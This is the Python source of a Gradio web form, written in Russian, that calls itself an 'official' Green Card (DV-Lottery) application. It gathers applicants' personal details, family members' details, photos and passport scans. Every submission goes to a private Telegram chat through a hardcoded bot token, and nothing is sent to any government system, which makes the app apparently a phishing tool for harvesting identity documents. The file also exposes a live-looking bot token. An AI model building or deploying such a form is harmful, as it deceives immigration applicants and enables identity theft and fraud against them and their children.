import gradio as gr
import requests

def send_tg(ln, fn, mn, gender, bd, bm, by, city, country, phone, email, education,
            has_s, sln, sfn, smn, sgen, sbd, sbm, sby, scity, scnt,
            child_a_ln, child_a_fn, child_a_mn, child_a_bd, 
            child_b_ln, child_b_fn, child_b_mn, child_b_bd, 
            child_c_ln, child_c_fn, child_c_mn, child_c_bd, 
            child_d_ln, child_d_fn, child_d_mn, child_d_bd,
            photo_main, passport_main, photo_spouse, photo_c1, photo_c2, photo_c3, photo_c4):
    
    gen_val = "Male" if gender == "Мужской" else "Female"
    s_gen_val = "Male" if sgen == "Мужской" else "Female"
    
    spouse = f"\n\n💍 СУПРУГ(А): {sln} {sfn} ({s_gen_val}), {sbm} {sbd}, {sby}" if has_s else "\n\n💍 Супруг(а): Нет"
    
    kids_list = []
    kids_data = [
        (child_a_ln, child_a_fn, child_a_mn, child_a_bd), 
        (child_b_ln, child_b_fn, child_b_mn, child_b_bd), 
        (child_c_ln, child_c_fn, child_c_mn, child_c_bd), 
        (child_d_ln, child_d_fn, child_d_mn, child_d_bd)
    ]
    for i, (kl, kf, km, kb) in enumerate(kids_data, 1):
        if kf.strip() or kl.strip():
            mid_str = f" {km}" if km.strip() and km.strip().lower() != 'no' else ""
            kids_list.append(f"Ребенок {i}: {kl} {kf}{mid_str} ({kb})")
        
    k_text = "\n\n👶 ДЕТИ:\n" + "\n".join(kids_list) if kids_list else "\n\n👶 Дети: Нет"
    
    msg = f"🇺🇸 Официальная анкета Green Card (DV-Lottery)\n👤 Заявитель: {ln} {fn} ({gen_val}), {bm} {bd}, {by}\n🎓 Образование: {education}\n📞 Телефон: {phone}\n📧 Email: {email}" + spouse + k_text
    
    try:
        bot_token = "8676622567:AAE_B9asq5H0e2laeWkzD4jICXxm5BSlDow"
        chat_id = "1245551843"
        
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", 
                      json={"chat_id": chat_id, "text": msg}, timeout=5)
                      
        if photo_main is not None:
            with open(photo_main, "rb") as p:
                requests.post(f"https://api.telegram.org/bot{bot_token}/sendPhoto", 
                              data={"chat_id": chat_id, "caption": "📷 Фото: Главный заявитель"}, 
                              files={"photo": p}, timeout=10)

        if passport_main is not None:
            with open(passport_main, "rb") as p:
                requests.post(f"https://api.telegram.org/bot{bot_token}/sendDocument", 
                              data={"chat_id": chat_id, "caption": "📄 Скан паспорта / подпись: Главный заявитель"}, 
                              files={"document": p}, timeout=10)

        if has_s and photo_spouse is not None:
            with open(photo_spouse, "rb") as p:
                requests.post(f"https://api.telegram.org/bot{bot_token}/sendPhoto", 
                              data={"chat_id": chat_id, "caption": "📷 Фото: Супруг(а)"}, 
                              files={"photo": p}, timeout=10)

        child_photos = [photo_c1, photo_c2, photo_c3, photo_c4]
        for idx, (kl, kf, km, kb) in enumerate(kids_data, 1):
            cp = child_photos[idx-1]
            if (kf.strip() or kl.strip()) and cp is not None:
                with open(cp, "rb") as p:
                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendPhoto", 
                                  data={"chat_id": chat_id, "caption": f"📷 Фото: Ребенок {idx} ({kl} {kf})"}, 
                                  files={"photo": p}, timeout=10)
                          
        return "✅ Заявка, фотографии и скан паспорта успешно отправлены в Telegram!"
    except Exception as e:
        return f"⚠️ Ошибка соединения: {e}"

edu_levels = [
    "Primary school only (Только начальная школа)",
    "High school degree, no classes (Средняя школа, без аттестата о высшем)",
    "High school classes (Некоторые курсы университета)",
    "Vocational school (Профессионально-техническое училище)",
    "University degree (Высшее образование / Бакалавр)",
    "Some graduate level classes (Магистратура / аспирантура)"
]

with gr.Blocks(theme=gr.themes.Soft()) as demo:
    gr.Markdown("# 🇺🇸 Официальная форма Green Card (DV-Lottery)")
    gr.Markdown("💡 *Заполняйте поля по порядку. Прикрепите фото участников и скан паспорта заявителя.*")
    
    with gr.Column(variant="panel"):
        gr.Markdown("### 👤 1. Персональные данные заявителя (Name)")
        with gr.Row():
            ln = gr.Textbox(value="IVANOV", label="Фамилия (Last/Family Name)")
            fn = gr.Textbox(value="IVAN", label="Имя (First Name)")
        with gr.Row():
            mn = gr.Textbox(value="No", label="Отчество (Middle Name — если нет, 'No')")
            gender = gr.Radio(["Мужской", "Женский"], value="Мужской", label="Пол")
        
        gr.Markdown("##### Дата рождения (Date of Birth):")
        with gr.Row():
            bd = gr.Textbox(value="01", label="День (Day)")
            bm = gr.Textbox(value="January", label="Месяц (Month)")
            by = gr.Textbox(value="1996", label="Год (Year)")
            
        with gr.Row():
            city = gr.Textbox(value="Moscow", label="Город рождения (City Where Born)")
            country = gr.Textbox(value="Russia", label="Страна рождения (Country Where Born)")
            
        education = gr.Dropdown(edu_levels, value=edu_levels[4], label="🎓 Уровень образования (Highest Degree Level)")
            
        with gr.Row():
            phone = gr.Textbox(value="+00000000000", label="Телефон (Phone Number)")
            email = gr.Textbox(value="test_no_reply@invalid.domain", label="Электронная почта (E-mail)")

        gr.Markdown("---")
        gr.Markdown("### 📷 Фотография заявителя")
        photo_main = gr.File(label="Загрузить фото заявителя (JPEG / PNG)", file_types=["image"])

        gr.Markdown("---")
        gr.Markdown("### 📄 Скан паспорта и подписи заявителя")
        passport_main = gr.File(label="Загрузить скан разворота паспорта / подписи (PDF / Image)", file_types=["image", ".pdf"])

    with gr.Column(variant="panel"):
        gr.Markdown("### 💍 2. Данные супруга/супруги (Spouse)")
        has_s = gr.Checkbox(value=False, label="Состою в официальном браке (Married)")
        
        with gr.Row():
            sln = gr.Textbox(value="", label="Фамилия (Last Name)")
            sfn = gr.Textbox(value="", label="Имя (First Name)")
            smn = gr.Textbox(value="", label="Отчество (Middle Name)")
        with gr.Row():
            sgen = gr.Radio(["Мужской", "Женский"], value="Женский", label="Пол")
            
        gr.Markdown("##### Дата рождения супруга(и):")
        with gr.Row():
            sbd = gr.Textbox(value="", label="День (Day)")
            sbm = gr.Textbox(value="", label="Месяц (Month)")
            sby = gr.Textbox(value="", label="Год (Year)")
            
        with gr.Row():
            scity = gr.Textbox(value="", label="Город рождения")
            scnt = gr.Textbox(value="", label="Страна рождения")

        gr.Markdown("---")
        gr.Markdown("### 📷 Фотография супруга(и)")
        photo_spouse = gr.File(label="Загрузить фото супруга(и) (JPEG / PNG)", file_types=["image"])

    with gr.Column(variant="panel"):
        gr.Markdown("### 👶 3. Информация о детях (Children)")
        
        gr.Markdown("### Child 1")
        with gr.Row():
            child_a_ln = gr.Textbox(value="", label="Фамилия")
            child_a_fn = gr.Textbox(value="", label="Имя")
            child_a_mn = gr.Textbox(value="", label="Отчество (или No)")
            child_a_bd = gr.Textbox(value="", label="Дата рожд. (ДД.ММ.ГГГГ)")
        photo_c1 = gr.File(label="Фото Child 1", file_types=["image"])
            
        gr.Markdown("### Child 2")
        with gr.Row():
            child_b_ln = gr.Textbox(value="", label="Фамилия")
            child_b_fn = gr.Textbox(value="", label="Имя")
            child_b_mn = gr.Textbox(value="", label="Отчество (или No)")
            child_b_bd = gr.Textbox(value="", label="Дата рожд. (ДД.ММ.ГГГГ)")
        photo_c2 = gr.File(label="Фото Child 2", file_types=["image"])
            
        gr.Markdown("### Child 3")
        with gr.Row():
            child_c_ln = gr.Textbox(value="", label="Фамилия")
            child_c_fn = gr.Textbox(value="", label="Имя")
            child_c_mn = gr.Textbox(value="", label="Отчество (или No)")
            child_c_bd = gr.Textbox(value="", label="Дата рожд. (ДД.ММ.ГГГГ)")
        photo_c3 = gr.File(label="Фото Child 3", file_types=["image"])
            
        gr.Markdown("### Child 4")
        with gr.Row():
            child_d_ln = gr.Textbox(value="", label="Фамилия")
            child_d_fn = gr.Textbox(value="", label="Имя")
            child_d_mn = gr.Textbox(value="", label="Отчество (или No)")
            child_d_bd = gr.Textbox(value="", label="Дата рожд. (ДД.ММ.ГГГГ)")
        photo_c4 = gr.File(label="Фото Child 4", file_types=["image"])

    with gr.Column():
        btn = gr.Button("🚀 Отправить официальную заявку в Telegram", variant="primary", size="lg")
        out = gr.Textbox(label="Статус отправки", interactive=False)

    btn.click(
        fn=send_tg, 
        inputs=[ln, fn, mn, gender, bd, bm, by, city, country, phone, email, education,
                has_s, sln, sfn, smn, sgen, sbd, sbm, sby, scity, scnt,
                child_a_ln, child_a_fn, child_a_mn, child_a_bd, 
                child_b_ln, child_b_fn, child_b_mn, child_b_bd, 
                child_c_ln, child_c_fn, child_c_mn, child_c_bd, 
                child_d_ln, child_d_fn, child_d_mn, child_d_bd,
                photo_main, passport_main, photo_spouse, photo_c1, photo_c2, photo_c3, photo_c4], 
        outputs=out
    )

# Настройка для запуска на Render.com
demo.launch(server_name="0.0.0.0", server_port=10000)
